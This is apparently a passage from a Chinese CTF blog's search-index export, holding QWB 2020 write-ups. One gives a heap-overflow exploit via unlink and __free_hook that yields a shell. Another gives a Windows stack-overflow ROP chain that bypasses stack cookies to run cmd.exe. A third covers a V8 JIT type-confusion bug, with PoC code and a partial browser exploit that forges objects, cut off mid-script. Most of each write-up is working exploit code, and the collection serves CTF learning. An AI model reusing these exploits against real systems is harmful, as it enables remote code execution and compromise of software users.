&#x27;cmd.exe\\x00&#x27;)#getshellsh.sendlineafter(&#x27;Command: &#x27;, &#x27;5&#x27;)sh.interactive()","categories":["CTF"],"tags":["unlink","堆溢出","windows漏洞利用","heap spray"]},{"title":"qwb2020_direct","url":"/2020/08/21/qwb2020-direct/","content":"edit功能里的offset和size都为有符号数，因此，可以令offset为负数,size为整数，这样，可以对当前这个堆的上方任意地址进行写数据。\n\n由于程序中全程使用的是write进行输出，加上程序没有show功能，因此，攻击IO_2_1_stdout的方法在这里就泄露不了数据。\n\n我们看到close功能，调用的是readdir函数，然后输出文件名。我们可以构造这样的布局，让dirp对象的堆处于chunk0和chunk1之间，即chunk0、dirp、chunk1、chunk2这样的布局，然后利用chunk2向上溢出，修改chunk1的size和prev_size，使得其被free时，向前合并，将dirp包含到中间，然后通过malloc，即可控制dirp的内容，将对应的name字符串做填充，一直填充到下方剩余的unsorted bin的fd处，这样print的时候就可以将unsorted bin的fd也打印出来，得到地址后就可以很容易利用了。利用unlink获得任意地址写\n#coding:utf8from pwn import *#sh = process(&#x27;./direct&#x27;)#context.log_level = &#x27;debug&#x27;sh = remote(&#x27;106.14.214.3&#x27;,1912)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;)_IO_2_1_stdout_s = libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]free_hook_s = libc.symbols[&#x27;__free_hook&#x27;]malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]system_s = libc.symbols[&#x27;system&#x27;]def add(index,size):   sh.sendlineafter(&#x27;Your choice: &#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;Index:&#x27;,str(index))   sh.sendlineafter(&#x27;Size:&#x27;,str(size))def edit(index,offset,size,content):   sh.sendlineafter(&#x27;Your choice: &#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;Index:&#x27;,str(index))   sh.sendlineafter(&#x27;Offset:&#x27;,str(offset))   sh.sendlineafter(&#x27;Size:&#x27;,str(size))   sh.sendafter(&#x27;Content:&#x27;,content)def delete(index):   sh.sendlineafter(&#x27;Your choice: &#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;Index:&#x27;,str(index))def open_f():   sh.sendlineafter(&#x27;Your choice: &#x27;,&#x27;4&#x27;)def close_f():   sh.sendlineafter(&#x27;Your choice: &#x27;,&#x27;5&#x27;)add(0,0xF0) #0add(1,0x80) #1open_f()add(2,0xF0) #2add(3,0xF0) #3for i in range(4,11):   add(i,0xF0)close_f()for i in range(4,11):   delete(i)#0放入unsorted bindelete(0)#向上溢出，修改2的prev_size和sizeedit(3,-0x110,0x10,p64(0x8040 + 0x90 + 0x100) + p64(0x100))#形成overlap chunkdelete(2)add(0,0x90)add(2,0xA0)add(4,0x80)add(5,0x10)add(6,0x10)edit(6,-0x15,0x15,&#x27;a&#x27;*0x15)close_f()sh.recvuntil(&#x27;a&#x27;*0x15)main_arena_xx = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))malloc_hook_addr = (main_arena_xx &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)libc_base = malloc_hook_addr - malloc_hook_sfree_hook_addr = libc_base + free_hook_ssystem_addr = libc_base + system_sprint &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;free_hook_addr=&#x27;,hex(free_hook_addr)print &#x27;system_addr=&#x27;,hex(system_addr)#delete(4)delete(1)edit(2,0,0x68,&#x27;b&#x27;*0x50 + p64(0) + p64(0x91) + p64(free_hook_addr))add(1,0x80)edit(1,0,0x8,&#x27;/bin/sh\\x00&#x27;)add(7,0x80)edit(7,0,0x8,p64(system_addr))#getshelldelete(1)sh.interactive()","categories":["CTF"],"tags":["堆溢出","下标越界","dirp泄漏地址"]},{"title":"qwb2020_easyoverflow","url":"/2020/08/21/qwb2020-easyoverflow/","content":"栈溢出，可以利用3次\n\n由于没有截断字符串，因此puts可以泄露出栈里的数据，在最后一次我们做rop重新回到main函数再一次进行利用，泄露出其他数据。由于windows上调用writefile的参数太多了，我们就直接使用kernel32.dll里的LoadLibraryA获得ucrtbase.dll加载地址，然后得到system地址，调用system(“cmd.exe”)来getshell。\n#coding:utf8from pwn import *#context.log_level = &#x27;debug&#x27;Local = Falseif Local:   kernel32_offset = 0x84d4   ntdll_offset = 0x6E871   #add dword ptr [rbp - 0x14], esi ; mov eax, edx ; ret   add_p_rbp_esi = 0x4c464   pop_rbp = 0x1281   pop_rsi = 0x2481   pop_rcx = 0x95da5   LoadLibraryA = 0x1FB90   add_rax_rcx = 0x72722   jmp_rax = 0x258e0   system_offset = 0xA40C0   sh = remote(&#x27;192.168.232.137&#x27;,6666)else:   kernel32_offset = 0x17974   ntdll_offset = 0x6A271   #add dword ptr [rbp - 0x14], esi ; mov eax, edx ; ret   add_p_rbp_esi = 0x493a0   pop_rbp = 0x120c   pop_rsi = 0x1661   pop_rcx = 0x9217b   LoadLibraryA = 0x1F220   add_rax_rcx = 0x5dc9   jmp_rax = 0x236e0   system_offset = 0xABBA0   sh = remote(&#x27;39.99.46.209&#x27;,13389)#第一轮sh.sendafter(&#x27;input:&#x27;,&#x27;a&#x27;*0x100)sh.recvuntil(&#x27;a&#x27;*0x100)stack_cookie = u64(sh.recvuntil(&#x27;\\r\\n&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;))print &#x27;stack_cookie=&#x27;,hex(stack_cookie)sh.sendafter(&#x27;input:&#x27;,&#x27;a&#x27;*0x118)sh.recvuntil(&#x27;a&#x27;*0x118)exe_base = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;)) - 0x12f4data_addr = exe_base + 0x3e80print &#x27;exe_base=&#x27;,hex(exe_base)print &#x27;data_addr=&#x27;,hex(data_addr)main_addr = exe_base + 0x1000sh.sendafter(&#x27;input:&#x27;,&#x27;a&#x27;*0x100 + p64(stack_cookie) + &#x27;a&#x27;*0x10 + p64(main_addr))#第二轮sh.sendafter(&#x27;input:&#x27;,&#x27;a&#x27;*0x100)sh.recvuntil(&#x27;a&#x27;*0x100)stack_cookie = u64(sh.recvuntil(&#x27;\\r\\n&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;))print &#x27;stack_cookie=&#x27;,hex(stack_cookie)#泄露kernel32.dll地址sh.sendafter(&#x27;input:&#x27;,&#x27;a&#x27;*0x150)sh.recvuntil(&#x27;a&#x27;*0x150)kernel32_base = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;)) - kernel32_offsetprint &#x27;kernel32_base=&#x27;,hex(kernel32_base)add_p_rbp_esi += kernel32_basepop_rbp += kernel32_basepop_rsi += kernel32_baseLoadLibraryA += kernel32_baseadd_rax_rcx += kernel32_basejmp_rax += kernel32_basesh.sendafter(&#x27;input:&#x27;,&#x27;a&#x27;*0x100 + p64(stack_cookie) + &#x27;a&#x27;*0x10 + p64(main_addr))#第三轮sh.sendafter(&#x27;input:&#x27;,&#x27;a&#x27;*0x100)sh.recvuntil(&#x27;a&#x27;*0x100)stack_cookie = u64(sh.recvuntil(&#x27;\\r\\n&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;))print &#x27;stack_cookie=&#x27;,hex(stack_cookie)#泄露ntdll.dll地址sh.sendafter(&#x27;input:&#x27;,&#x27;a&#x27;*0x178)sh.recvuntil(&#x27;a&#x27;*0x178)ntdll_base = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;)) - ntdll_offsetprint &#x27;ntdll_base=&#x27;,hex(ntdll_base)pop_rcx += ntdll_basesh.sendafter(&#x27;input:&#x27;,&#x27;a&#x27;*0x100 + p64(stack_cookie) + &#x27;a&#x27;*0x10 + p64(main_addr))#第四轮sh.sendafter(&#x27;input:&#x27;,&#x27;a&#x27;*0x100)sh.recvuntil(&#x27;a&#x27;*0x100)stack_cookie = u64(sh.recvuntil(&#x27;\\r\\n&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;))print &#x27;stack_cookie=&#x27;,hex(stack_cookie)sh.sendafter(&#x27;input:&#x27;,&#x27;haivk&#x27;)payload = &#x27;a&#x27;*0x100 + p64(stack_cookie) + &#x27;a&#x27;*0x8 + p64(system_offset)#将ucrtbase.dll字符串保存到data段payload += p64(pop_rbp) + p64(data_addr + 0x14)payload += p64(pop_rsi) + p64(0x74726375)payload += p64(add_p_rbp_esi)payload += p64(pop_rbp) + p64(data_addr + 0x4 + 0x14)payload += p64(pop_rsi) + p64(0x65736162)payload += p64(add_p_rbp_esi)payload += p64(pop_rbp) + p64(data_addr + 0x8 + 0x14)payload += p64(pop_rsi) + p64(0x6C6C642E)payload += p64(add_p_rbp_esi)payload += p64(pop_rbp) + p64(data_addr + 0xC + 0x14)payload += p64(pop_rsi) + p64(0)payload += p64(add_p_rbp_esi)#将cmd.exe字符串保存到data段payload += p64(pop_rbp) + p64(data_addr + 0x10 + 0x14)payload += p64(pop_rsi) + p64(0x2E646D63)payload += p64(add_p_rbp_esi)payload += p64(pop_rbp) + p64(data_addr + 0x14 + 0x14)payload += p64(pop_rsi) + p64(0x657865)payload += p64(add_p_rbp_esi)#LoadLibraryA(&quot;ucrtbase.dll&quot;)payload += p64(pop_rcx) + p64(data_addr) + p64(pop_rsi) + p64(add_rax_rcx) + p64(LoadLibraryA)payload += p64(pop_rcx) + p64(system_offset) + p64(add_rax_rcx)payload += p64(pop_rcx) + p64(data_addr + 0x10) + p64(jmp_rax)raw_input()sh.sendafter(&#x27;input:&#x27;,payload)sh.interactive()\n","categories":["CTF"],"tags":["栈溢出","ROP","windows漏洞利用"]},{"title":"强网杯2020决赛RealWord的Chrome逃逸——GOOexec（GOO）","url":"/2020/12/17/qwb2020-final-GOOexec/","content":"文章首发于安全KER https://www.anquanke.com/post/id/224195\n0x00 前言刚开始接触v8方面的漏洞利用，就从这题分享一下我学习的过程。\n0x01 前置知识JIT简单来说，JS引擎在解析javascript代码时，如果发现js里有段代码一直在做重复的类似操作，比如一个循环语句，且重复次数超过某个阈值，那么就会将这段JS代码翻译为本机的汇编代码，以提高代码的执行速度，这就叫JIT优化，如下的js代码可以触发v8的JIT优化\nfor (var i=0;i&lt;0x20000;i++) &#123;&#125;\n使用./d8 1.js -print-opt-code，可以查看JIT代码\nMAPmap是一个对象，在v8里，每一个js对象内部都有一个map对象指针，v8通过map的值来判断这个js对象到底是哪种类型。\n类型混淆（Type Confusion）如果map的类型发生错误，将会发生类型混淆，比如原本一个存double数值的数组对象，map变成了对象数组的类型，那么再次访问其元素时，取出的不再是一个double值，而是该double值作为地址指向的对象。因此可以用来伪造对象，只需伪造一个ArrayBuffer对象，即可实现任意地址读写。类型混淆往往跟JIT编译后的代码有关，某些情况下JIT即时编译的代码里的判断条件可能考虑的不充分便会发生类型混淆。\nV8的数组V8的数组是一个对象，其条目仍然是一个对象，数据存在条目对象的里，如果是DOUBLE_ELEMENTS类型，则element对象的数据区直接保存这个double值(64位)，如果是其他类型，则将数据包装为一个对象，element对象的数据区将保存这个对象的地址。element的类型当中，以PACKED开头的代表这是一个密集型数组(快数组)；以HOLEY开头的数组为稀疏数组(慢数组)数组常见的几种element类型变化情况如下，类型变化只能沿着箭头方向进行，一旦从一种类型变为另一种类型，就不能再逆回去了。\nArray(0)和new Array(0)和[]的区别使用如下代码测试\nvar a = Array(0);%DebugPrint(a);var b = new Array(0);%DebugPrint(b);var c = [];%DebugPrint(c);\n测试结果\nArray(0): 0x15ed08148565: [JSArray] - map: 0x15ed083038d5 &lt;Map(HOLEY_SMI_ELEMENTS)&gt; [FastProperties] - prototype: 0x15ed082cb529 &lt;JSArray[0]&gt; - elements: 0x15ed080426dd &lt;FixedArray[0]&gt; [HOLEY_SMI_ELEMENTS] - length: 0 - properties: 0x15ed080426dd &lt;FixedArray[0]&gt; &#123;    0x15ed08044649: [String] in ReadOnlySpace: #length: 0x15ed08242159 &lt;AccessorInfo&gt; (const accessor descriptor) &#125;new Array(0): 0x15ed08148575: [JSArray] - map: 0x15ed083038d5 &lt;Map(HOLEY_SMI_ELEMENTS)&gt; [FastProperties] - prototype: 0x15ed082cb529 &lt;JSArray[0]&gt; - elements: 0x15ed080426dd &lt;FixedArray[0]&gt; [HOLEY_SMI_ELEMENTS] - length: 0 - properties: 0x15ed080426dd &lt;FixedArray[0]&gt; &#123;    0x15ed08044649: [String] in ReadOnlySpace: #length: 0x15ed08242159 &lt;AccessorInfo&gt; (const accessor descriptor) &#125;[]: 0x15ed08148585: [JSArray] - map: 0x15ed0830385d &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties] - prototype: 0x15ed082cb529 &lt;JSArray[0]&gt; - elements: 0x15ed080426dd &lt;FixedArray[0]&gt; [PACKED_SMI_ELEMENTS] - length: 0 - properties: 0x15ed080426dd &lt;FixedArray[0]&gt; &#123;    0x15ed08044649: [String] in ReadOnlySpace: #length: 0x15ed08242159 &lt;AccessorInfo&gt; (const accessor descriptor) &#125;\n我们看到，Array(0)和new Array(0)产生的对象在不考虑JIT的情况下是一样的，而[]类型为PACKED_SMI_ELEMENTS，如果考虑了JIT，那么情况会变得复杂，稍后的题中将遇到这种情况。\n0x02 漏洞分析切入点题目给了我们一个diff文件，以及经过patch后编译的chrome浏览器和v8引擎。其中diff文件如下\ndiff --git a/src/compiler/load-elimination.cc b/src/compiler/load-elimination.ccindex ff79da8c86..8effdd6e15 100644--- a/src/compiler/load-elimination.cc+++ b/src/compiler/load-elimination.cc@@ -866,8 +866,8 @@ Reduction LoadElimination::ReduceTransitionElementsKind(Node* node) &#123;     if (object_maps.contains(ZoneHandleSet&lt;Map&gt;(source_map))) &#123;       object_maps.remove(source_map, zone());       object_maps.insert(target_map, zone());-      AliasStateInfo alias_info(state, object, source_map);-      state = state-&gt;KillMaps(alias_info, zone());+      // AliasStateInfo alias_info(state, object, source_map);+      // state = state-&gt;KillMaps(alias_info, zone());       state = state-&gt;SetMaps(object, object_maps, zone());     &#125;   &#125; else &#123;@@ -892,7 +892,7 @@ Reduction LoadElimination::ReduceTransitionAndStoreElement(Node* node) &#123;   if (state-&gt;LookupMaps(object, &amp;object_maps)) &#123;     object_maps.insert(double_map, zone());     object_maps.insert(fast_map, zone());-    state = state-&gt;KillMaps(object, zone());+    // state = state-&gt;KillMaps(object, zone());     state = state-&gt;SetMaps(object, object_maps, zone());   &#125;   // Kill the elements as well.\n首先，patch点出现在ReduceTransitionElementsKind和ReduceTransitionAndStoreElement函数中，从源文件路径知道这个类跟JIT编译器有关，在某些情况下会影响到编译出的代码。经过个人的研究，发现 ReduceTransitionElementsKind的作用是为了加快elements的类型转换，如果在一段会被JIT优化的js代码段中对数组的element进行类型转换操作，就会调用这个函数来构建相关的汇编代码。\n小实验首先b ReduceTransitionElementsKind和bReduceTransitionAndStoreElement设置断点，运行如下的测试代码\nvar a;for (var i=0;i&lt;0x2000;i++) &#123;   a = Array(0);   a[0] = 1.1;&#125;\n发现确实能够断下来，我们再试试这两段代码，发现都不能下断\nvar a;for (var i=0;i&lt;0x2000;i++) &#123;   a = new Array(0);   a[0] = 1.1;&#125;\nvar a;for (var i=0;i&lt;0x20000;i++) &#123;   a = [];   a[0] = 1.1;&#125;\n为了解释其中的原因，我们查看一下JIT的汇编代码（截取部分）第一段js代码的JIT汇编中，Array(0)的创建过程\n0x33ea00084f47    87  49b8e80d0beb79550000 REX.W movq r8,0x5579eb0b0de8    ;; external reference (Heap::NewSpaceAllocationTopAddress())0x33ea00084f51    91  4d8b08         REX.W movq r9,[r8]0x33ea00084f54    94  4d8d5910       REX.W leaq r11,[r9+0x10]0x33ea00084f58    98  49bcf00d0beb79550000 REX.W movq r12,0x5579eb0b0df0    ;; external reference (Heap::NewSpaceAllocationLimitAddress())0x33ea00084f62    a2  4d391c24       REX.W cmpq [r12],r110x33ea00084f66    a6  0f8606020000   jna 0x33ea00085172  &lt;+0x2b2&gt;0x33ea00084f6c    ac  4d8d5910       REX.W leaq r11,[r9+0x10]0x33ea00084f70    b0  4d8918         REX.W movq [r8],r110x33ea00084f73    b3  4983c101       REX.W addq r9,0x10x33ea00084f77    b7  41bb5d383008   movl r11,0x830385d      ;; (compressed) object: 0x33ea0830385d &lt;Map(PACKED_SMI_ELEMENTS)&gt;0x33ea00084f7d    bd  458959ff       movl [r9-0x1],r110x33ea00084f81    c1  4d8bb550010000 REX.W movq r14,[r13+0x150] (root (empty_fixed_array))0x33ea00084f88    c8  45897103       movl [r9+0x3],r140x33ea00084f8c    cc  45897107       movl [r9+0x7],r140x33ea00084f90    d0  41c7410b00000000 movl [r9+0xb],0x00x33ea00084f98    d8  49bf89252d08ea330000 REX.W movq r15,0x33ea082d2589    ;; object: 0x33ea082d2589 &lt;PropertyCell name=0x33ea080c91a9 &lt;String[1]: #a&gt; value=0x33ea08383dd5 &lt;JSArray[1]&gt;&gt;0x33ea00084fa2    e2  45894f0b       movl [r15+0xb],r9\n可以看到，在这里，Array(0)初始为了PACKED_SMI_ELEMENTS类型的数组，因此对其条目赋予double值时，会发生类型转换。接下来，我们看第二段js代码的JIT代码中创建new Array(0)的部分\n0x57300084f47    87  49b8e83d22e5f8550000 REX.W movq r8,0x55f8e5223de8    ;; external reference (Heap::NewSpaceAllocationTopAddress())0x57300084f51    91  4d8b08         REX.W movq r9,[r8]0x57300084f54    94  4d8d5910       REX.W leaq r11,[r9+0x10]0x57300084f58    98  49bcf03d22e5f8550000 REX.W movq r12,0x55f8e5223df0    ;; external reference (Heap::NewSpaceAllocationLimitAddress())0x57300084f62    a2  4d391c24       REX.W cmpq [r12],r110x57300084f66    a6  0f86b5010000   jna 0x57300085121  &lt;+0x261&gt;0x57300084f6c    ac  4d8d5910       REX.W leaq r11,[r9+0x10]0x57300084f70    b0  4d8918         REX.W movq [r8],r110x57300084f73    b3  4983c101       REX.W addq r9,0x10x57300084f77    b7  41bb25393008   movl r11,0x8303925       ;; (compressed) object: 0x057308303925 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;0x57300084f7d    bd  458959ff       movl [r9-0x1],r110x57300084f81    c1  4d8bb550010000 REX.W movq r14,[r13+0x150] (root (empty_fixed_array))0x57300084f88    c8  45897103       movl [r9+0x3],r140x57300084f8c    cc  45897107       movl [r9+0x7],r140x57300084f90    d0  41c7410b00000000 movl [r9+0xb],0x00x57300084f98    d8  49bf8d252d0873050000 REX.W movq r15,0x573082d258d    ;; object: 0x0573082d258d &lt;PropertyCell name=0x0573080c91a9 &lt;String[1]: #a&gt; value=0x057308373935 &lt;JSArray[1]&gt;&gt;\n可以看到，new Array(0)一开始就是HOLEY_DOUBLE_ELEMENTS类型，可以满足a[0] &#x3D; 1.1的操作，不需要再做类型转换。接下来，我们看第三段js代码的JIT代码中创建[]的部分，发现[]一开始就是PACKED_DOUBLE_ELEMENTS类型，可以满足a[0] &#x3D; 1.1的操作，不需要再做类型转换。\n0x30bd00084f47    87  49b8e80d40d4c6550000 REX.W movq r8,0x55c6d4400de8    ;; external reference (Heap::NewSpaceAllocationTopAddress())0x30bd00084f51    91  4d8b08         REX.W movq r9,[r8]0x30bd00084f54    94  4d8d5910       REX.W leaq r11,[r9+0x10]0x30bd00084f58    98  49bcf00d40d4c6550000 REX.W movq r12,0x55c6d4400df0    ;; external reference (Heap::NewSpaceAllocationLimitAddress())0x30bd00084f62    a2  4d391c24       REX.W cmpq [r12],r110x30bd00084f66    a6  0f8695010000   jna 0x30bd00085101  &lt;+0x241&gt;0x30bd00084f6c    ac  4d8d5910       REX.W leaq r11,[r9+0x10]0x30bd00084f70    b0  4d8918         REX.W movq [r8],r110x30bd00084f73    b3  4983c101       REX.W addq r9,0x10x30bd00084f77    b7  41bbfd383008   movl r11,0x83038fd      ;; (compressed) object: 0x30bd083038fd &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt;0x30bd00084f7d    bd  458959ff       movl [r9-0x1],r110x30bd00084f81    c1  4d8bb550010000 REX.W movq r14,[r13+0x150] (root (empty_fixed_array))0x30bd00084f88    c8  45897103       movl [r9+0x3],r140x30bd00084f8c    cc  45897107       movl [r9+0x7],r140x30bd00084f90    d0  41c7410b00000000 movl [r9+0xb],0x00x30bd00084f98    d8  49bf81252d08bd300000 REX.W movq r15,0x30bd082d2581    ;; object: 0x30bd082d2581 &lt;PropertyCell name=0x30bd080c91a9 &lt;String[1]: #a&gt; value=0x30bd083c4e5d &lt;JSArray[1]&gt;&gt;\n实验总结从上面的实验来看，数组的elements类型在JIT下和普通js下是不一样的，JIT会对其进行优化。其中如果是new Array(0)和[]创建的数组，那么其数组的elements初始时的类型就已经是目标数据的类型了。因此就不需要再调用ReduceTransitionElementsKind和ReduceTransitionAndStoreElement进行类型转换。因此在利用中，我们应该使用Array(0)的方式来创建数组。\n漏洞分析patch了AliasStateInfo alias_info(state, object, source_map);和state = state-&gt;KillMaps(object, zone());，我们先来看看KillMaps的源码\nLoadElimination::AbstractState const* LoadElimination::AbstractState::KillMaps(    const AliasStateInfo&amp; alias_info, Zone* zone) const &#123;  if (this-&gt;maps_) &#123;    AbstractMaps const* that_maps = this-&gt;maps_-&gt;Kill(alias_info, zone);    if (this-&gt;maps_ != that_maps) &#123;      AbstractState* that = new (zone) AbstractState(*this);      that-&gt;maps_ = that_maps;      return that;    &#125;  &#125;  return this;&#125;\n继续看Kill的源码,如果有两个node指向同一个对象，则创建了新map。\nLoadElimination::AbstractElements const*LoadElimination::AbstractElements::Kill(Node* object, Node* index,                                        Zone* zone) const &#123;  for (Element const element : this-&gt;elements_) &#123;    if (element.object == nullptr) continue;    if (MayAlias(object, element.object)) &#123; //如果有两个node指向同一个对象      AbstractElements* that = new (zone) AbstractElements(zone);      for (Element const element : this-&gt;elements_) &#123;        if (element.object == nullptr) continue;        DCHECK_NOT_NULL(element.index);        DCHECK_NOT_NULL(element.value);        if (!MayAlias(object, element.object) ||            !NodeProperties::GetType(index).Maybe(                NodeProperties::GetType(element.index))) &#123;          that-&gt;elements_[that-&gt;next_index_++] = element;        &#125;      &#125;      that-&gt;next_index_ %= arraysize(elements_);      return that;    &#125;  &#125;  return this;&#125;\n从上面的源码来看，如果有两个node指向的是同一个对象，那么state = state-&gt;KillMaps(object, zone());就会更新两个node的checkmap，这样后续生成JIT代码时，用不同的node去操作源对象也不会发生问题。为了进一步验证猜想，我们用gdb调试一下。gdb设置参数，其中–no-enable-slow-asserts是为了能够使用p state-&gt;Print()来查看checkmaps的信息，否则会报错。\nset args --allow-natives-syntax ./3.js --no-enable-slow-asserts\n测试代码\nfunction opt(a,b) &#123;    a[0] = 1.1;   b[0] = 1.1;   a[0] = &#123;&#125;;   b[0] = 1.1;&#125;var a;for (var i=0;i&lt;0x2000;i++) &#123;    a = Array(0);   opt(a,a);&#125;a = Array(0);opt(a,a);print(a[0]);\n执行SetMaps之前，因为有a[0] = 1.1;b[0] = 1.1;，所以它们之前已经是HOLEY_DOUBLE_ELEMENTS类型执行之后，由于没有KillMaps，因此b仍然保留为HOLEY_DOUBLE_ELEMENTS类型如果接下来执行   b[0] = 1.1;，按理来说是以HOLEY_DOUBLE_ELEMENTS的方式向elements里写了一个double值，由于它指向的对象已经变成了HOLEY_ELEMENTS类型，那么再次从中取元素时，double值被当成对象指针对待，因此通过控制double值，能够使得取出的值作为指针能正好指向我们可控的内存区，那么我们就可以伪造对象了。然而实际情况是，执行 b[0] = 1.1;时，仍然是以HOLEY_ELEMENTS的方式写入，即将1.1包装为一个HeapNumber，然后保存指针到elements。在JIT编译的时候,末尾的两句a[0] = &#123;&#125;;和b[0] = 1.1;不能同时出现，否则JIT编译器收集到的信息比较充分会使得漏洞利用失败，因此应该想办法让这两句的编译时期分开，由此可以加一个条件判断，这样，两句在编译时期不会同时出现。\nfunction opt(a,b,f1,f2) &#123;   a[0] = 1.1;   b[0] = 1.1;   if (f1)      a[0] = &#123;&#125;;   if (f2)      b[0] = 1.1;&#125;var a;for (var i=0;i&lt;0x2000;i++) &#123;   a = Array(0);   opt(a,a,true,false);   a = Array(0);   opt(a,a,false,true);&#125;a = Array(0);opt(a,a,true,true);print(a[0]);\n通过%DebugPrint(a)查看对象a\nDebugPrint: 0x2aa8083dc8e1: [JSArray] - map: 0x2aa808303975 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties] - prototype: 0x2aa8082cb529 &lt;JSArray[0]&gt; - elements: 0x2aa8083dc99d &lt;FixedArray[17]&gt; [HOLEY_ELEMENTS] - length: 1 - properties: 0x2aa8080426dd &lt;FixedArray[0]&gt; &#123;    0x2aa808044649: [String] in ReadOnlySpace: #length: 0x2aa808242159 &lt;AccessorInfo&gt; (const accessor descriptor) &#125; - elements: 0x2aa8083dc99d &lt;FixedArray[17]&gt; &#123;           0: -858993459pwndbg&gt; dd 0x2aa8083dc99c00002aa8083dc99c     080424a5 00000022 9999999a 3ff1999900002aa8083dc9ac     080423a1 080423a1 080423a1 080423a100002aa8083dc9bc     080423a1 080423a1 080423a1 080423a100002aa8083dc9cc     080423a1 080423a1 080423a1 080423a1\n可以看到，1.1这个double值被误认为是对象指针，由此可以伪造对象。\nJIT代码分析首先poc的前面一大部分操作都是为了生成有问题的JIT代码，LoadElimination::ReduceTransitionElementsKind是在编译器编译时调用的，而不是JIT代码运行时调用的。JIT编译完成后就不需要再调用这个进行转换了，因为转换的操作已经固化成汇编的形式了。如下是截取的有问题的JIT代码（关键部分）\n0x353900085199   2d9  45398528010000 cmpl [r13+0x128] (root (heap_number_map)),r80x3539000851a0   2e0  0f84b1010000   jz 0x353900085357  &lt;+0x497&gt;0x3539000851a6   2e6  453985a8010000 cmpl [r13+0x1a8] (root (bigint_map)),r80x3539000851ad   2ed  0f8492010000   jz 0x353900085345  &lt;+0x485&gt;0x3539000851b3   2f3  8b4f07         movl rcx,[rdi+0x7]0x3539000851b6   2f6  4903cd         REX.W addq rcx,r130x3539000851b9   2f9  c5fb114107     vmovsd [rcx+0x7],xmm00x3539000851be   2fe  488be5         REX.W movq rsp,rbp0x3539000851c1   301  5d             pop rbp0x3539000851c2   302  c22800         ret 0x28\n我们再看一下在正常的v8引擎中相同部分编译的JIT代码\n0x320a00084f30    70  48b9253930080a320000 REX.W movq rcx,0x320a08303925    ;; object: 0x320a08303925 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;................................................................0x320a0008519d   2dd  4539a528010000 cmpl [r13+0x128] (root (heap_number_map)),r120x320a000851a4   2e4  0f84da010000   jz 0x320a00085384  &lt;+0x4c4&gt;0x320a000851aa   2ea  4539a5a8010000 cmpl [r13+0x1a8] (root (bigint_map)),r120x320a000851b1   2f1  0f84ba010000   jz 0x320a00085371  &lt;+0x4b1&gt;0x320a000851b7   2f7  394fff         cmpl [rdi-0x1],rcx0x320a000851ba   2fa  0f858c020000   jnz 0x320a0008544c  &lt;+0x58c&gt;0x320a000851c0   300  8b4f07         movl rcx,[rdi+0x7]0x320a000851c3   303  4903cd         REX.W addq rcx,r130x320a000851c6   306  c5fb114107     vmovsd [rcx+0x7],xmm00x320a000851cb   30b  488b4de8       REX.W movq rcx,[rbp-0x18]0x320a000851cf   30f  488be5         REX.W movq rsp,rbp0x320a000851d2   312  5d             pop rbp0x320a000851d3   313  4883f904       REX.W cmpq rcx,0x40x320a000851d7   317  7f03           jg 0x320a000851dc  &lt;+0x31c&gt;0x320a000851d9   319  c22800         ret 0x28\n可以知道，漏洞的v8的JIT编译的代码正是因为少了这一句map类型的比较，从而导致了类型混淆。\n0x320a000851b7   2f7  394fff         cmpl [rdi-0x1],rcx\n漏洞利用现在的v8存在指针压缩机制(pointer compression)，在这种机制下，指针都用4字节来表示，即将指针的基址单独仅存储一次，然后每个指针只需存后4字节即可，因为前2字节一样，这样可以节省空间。这种机制下，堆地址是可以预测的，我们可以申请一个较大的堆空间，这样它的地址在同一台机子上就很稳定基本不变（会随系统的内存以及其他一些配置变化），在不同机子上有微小变化，可以枚举爆破。只需要伪造一个ArrayBuffer，即可实现任意地址读写，由于本题的v8是linux下的，因此比较好利用，直接泄露栈地址然后劫持栈做ROP即可。\n&lt;!DOCTYPE html&gt;&lt;html&gt;  &lt;body&gt;    &lt;script&gt;function opt(a,b,f1,f2)&#123;    a[0] = 1.1;    b[0] = 1.1;    if (f1)        a[0] = &#123;&#125;;    if (f2)        b[0] = 1.9035980891199164e+185; //这个浮点数在内存里的表示指向了faker[1]，因此，我们可以在faker[1]处开始伪造对象&#125;//申请一个大的Array，由于V8的compression ptr，其地址低四字节稳定const faker = new Array(0x10000);faker.fill(4.765139213524301e-270);var buf = new ArrayBuffer(0x10000);var dv = new DataView(buf);dv.setUint32(0,0xABCDEF78,true);//将一个32位整数打包位64位浮点数function p64(val) &#123;   dv.setUint32(0x8,val &amp; 0xFFFFFFFF,true);   dv.setUint32(0xC,val &gt;&gt; 32,true);   var float_val = dv.getFloat64(0x8,true);   return float_val;&#125;//将两个32位整数打包为一个64位浮点数function p64(low4,high4) &#123;   dv.setUint32(0x8,low4,true);   dv.setUint32(0xC,high4,true);   var float_val = dv.getFloat64(0x8,true);   return float_val;&#125;//解包64位浮点数的低四字节function u64_l(val) &#123;   dv.setFloat64(0x8,val,true);   return dv.getUint32(0x8,true);&#125;//解包64位浮点数的高四字节function u64_h(val) &#123;   dv.setFloat64(0x8,val,true);   return dv.getUint32(0xC,true);&#125;//伪造一个FixedJSArray对象用于构造addressOf和fakeObject原语faker[1] = p64(0x082031cd,0x080426dd);faker[2] = p64(0x08342135,0x2);//伪造FixedJSArray的elementfaker[3] = p64(0x080424a5,0x2);//强制触发JIT编译，生成有漏洞的代码let a;for (let i = 0; i &lt; 0x200000; i++)&#123;    a = Array(0);    opt(a,a,true,false);    a = Array(0);    opt(a,a,false,true);&#125;//调用有漏洞的JIT代码，使得对象a发生类型混淆a = Array(0);opt(a,a,true,true);function addressOf(obj) 